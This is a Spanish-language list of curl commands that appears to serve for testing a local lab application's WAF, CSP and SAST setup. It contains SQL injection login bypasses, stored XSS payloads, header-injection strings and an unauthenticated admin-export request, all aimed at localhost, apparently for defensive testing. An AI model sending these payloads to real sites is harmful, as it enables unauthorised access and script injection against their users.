## 🟦 1. **Login (fuerza bruta / SQLi)**

### 🔸 Login normal

```bash
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin", "password":"pass"}'
```

### 🔸 SQL Injection en `username`

```bash
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\" OR \"1\"=\"1", "password":"pass"}'
```

### 🔸 SQL Injection `' OR 1=1 --`

```bash
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"\' OR 1=1 --", "password":"any"}'
```

---

## 🟨 2. **XSS (almacenado/persistente)**

### 🔸 Inyección de `<script>` en comentario

```bash
curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(\"xss\")</script>"}'
```

### 🔸 XSS con `onerror`

```bash
curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<img src=x onerror=alert(1)>"}'
```

### 🔸 XSS con `javascript:` URI

```bash
curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<a href=\"javascript:alert(1)\">click</a>"}'
```

---

## 🟥 3. **Bypass WAF (cabeceras maliciosas)**

### 🔸 Inyección en User-Agent

```bash
curl -X POST http://localhost:8001/login \
  -H "User-Agent: <script>alert('x')</script>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test", "password":"test"}'
```

### 🔸 Inyección en Referer

```bash
curl -X POST http://localhost:8001/login \
  -H "Referer: javascript:alert('xss')" \
  -H "Content-Type: application/json" \
  -d '{"username":"test", "password":"test"}'
```

---

## 🟩 4. **Acceso sin autorización al endpoint sensible**

### 🔸 Exportar sin control de rol

```bash
curl -X GET http://localhost:8001/admin/export
```

---

## 🟧 5. **Escaneo SAST**

### 🔸 Verificar resultados simulados del SAST

```bash
curl http://localhost:8002/scan
```

---

## 🟫 6. **Verificación de estado CSP y WAF**

### 🔸 Estado del WAF

```bash
curl http://localhost:8001/
```

### 🔸 Estado del CSP

```bash
curl -i http://localhost:8003/
```

> Tip: usa `-i` para ver las cabeceras, incluyendo `Content-Security-Policy`.

---

## 🟪 7. **Lectura de comentarios (XSS persistente activo)**

### 🔸 Recuperar comentarios registrados

```bash
curl http://localhost:8001/comments
```

---

## 🟨 BONUS: Inyección en query string (para probar WAF)

```bash
curl "http://localhost:8001/login?user=<script>alert(1)</script>"
```
